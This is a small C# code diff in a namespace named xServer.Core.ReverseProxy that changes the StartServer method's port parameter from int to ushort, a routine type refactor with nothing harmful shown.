@@ -62,7 +62,7 @@ namespace xServer.Core.ReverseProxy
             _clients = new List<ReverseProxyClient>();
         }
 
-        public void StartServer(Client[] clients, string ipAddress, int port)
+        public void StartServer(Client[] clients, string ipAddress, ushort port)
         {
             Stop();
 
